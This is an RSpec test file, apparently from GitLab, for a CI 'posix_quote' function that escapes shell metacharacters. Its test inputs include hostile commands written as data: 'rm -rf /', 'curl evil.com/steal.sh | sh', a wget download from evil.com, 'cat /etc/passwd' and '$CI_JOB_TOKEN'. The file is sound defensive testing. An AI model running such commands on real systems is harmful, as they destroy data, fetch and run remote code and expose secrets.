# frozen_string_literal: true

require 'spec_helper'

RSpec.describe Gitlab::Ci::Config::Interpolation::Functions::PosixQuote, feature_category: :pipeline_composition do
  it 'validates function syntax in CI config context' do
    # Valid: $[[  inputs.user_file | posix_quote ]]
    expect(described_class.matches?('posix_quote')).to be_truthy

    # Invalid: posix_quote doesn't accept arguments
    expect(described_class.matches?('posix_quote()')).to be_falsey
    expect(described_class.matches?('posix_quote(1)')).to be_falsey
  end

  it 'escapes the given input' do
    function = described_class.new('posix_quote', nil)

    output = function.execute('String with " and \' and  blanks')

    expect(function).to be_valid
    expect(output).to eq('String\\ with\\ \\"\\ and\\ \\\'\\ and\\ \\ blanks')
  end

  context 'when given a shell fragment with meta/control characters' do
    let(:function) { described_class.new('posix_quote', nil) }

    it 'prevents argument splitting on blanks' do
      input = 'Blank space'
      output = function.execute(input)

      expect(output).to eq('Blank\\ space')
      # Without escaping, this would split into two arguments
    end

    it 'prevents single-quotes from starting/ending quotation' do
      input = 'Single-\'-quote'
      output = function.execute(input)

      expect(output).to eq('Single-\\\'-quote')
      # Without escaping, this would start/end a quoted string
    end

    it 'prevents double-quotes from starting/ending quotation' do
      input = 'Double-"-quote'
      output = function.execute(input)

      expect(output).to eq('Double-\\"-quote')
      # Without escaping, this would start/end a quoted string
    end

    it 'prevents command chaining with semicolon' do
      malicious_input = 'file.txt; rm -rf /'
      output = function.execute(malicious_input)

      expect(output).to eq('file.txt\\;\\ rm\\ -rf\\ /')
      # Without escaping, this would potentially execute: cat file.txt; rm -rf /
    end

    it 'prevents command substitution with backticks' do
      malicious_input = '`curl evil.com/steal.sh | sh`'
      output = function.execute(malicious_input)

      expect(output).to eq('\\`curl\\ evil.com/steal.sh\\ \\|\\ sh\\`')
      # Without escaping: backticks would potentially execute the curl command
    end

    it 'prevents command substitution with $(...)' do
      malicious_input = 'file_$(whoami).txt'
      output = function.execute(malicious_input)

      expect(output).to eq('file_\\$\\(whoami\\).txt')
      # Without escaping: would potentially execute whoami and leak username
    end

    it 'prevents pipe redirection attacks' do
      malicious_input = 'input.txt | cat /etc/passwd'
      output = function.execute(malicious_input)

      expect(output).to eq('input.txt\\ \\|\\ cat\\ /etc/passwd')
      # Without escaping: would potentially pipe to another command exposing sensitive files
    end

    it 'prevents newline injection for command chaining' do
      malicious_input = "file.txt\nwget http://evil.com/malware.sh"
      output = function.execute(malicious_input)

      expect(output).to eq("file.txt'\n'wget\\ http://evil.com/malware.sh")
      # Without escaping: newline could potentially start a new malicious command
    end

    it 'prevents environment variable exfiltration' do
      malicious_input = '$CI_JOB_TOKEN'
      output = function.execute(malicious_input)

      expect(output).to eq('\\$CI_JOB_TOKEN')
      # Without escaping: would potentially expose GitLab CI secrets
    end

    it 'prevents glob expansion attacks' do
      malicious_input = '*.rb'
      output = function.execute(malicious_input)

      expect(output).to eq('\\*.rb')
      # Without escaping: shell would potentially expand to all .rb files
    end
  end

  context 'when given a non-string input' do
    it 'returns an error' do
      function = described_class.new('posix_quote', nil)

      function.execute(100)

      expect(function).not_to be_valid
      expect(function.errors).to contain_exactly(
        'error in `posix_quote` function: invalid input type: posix_quote can only be used with string inputs'
      )
    end
  end
end
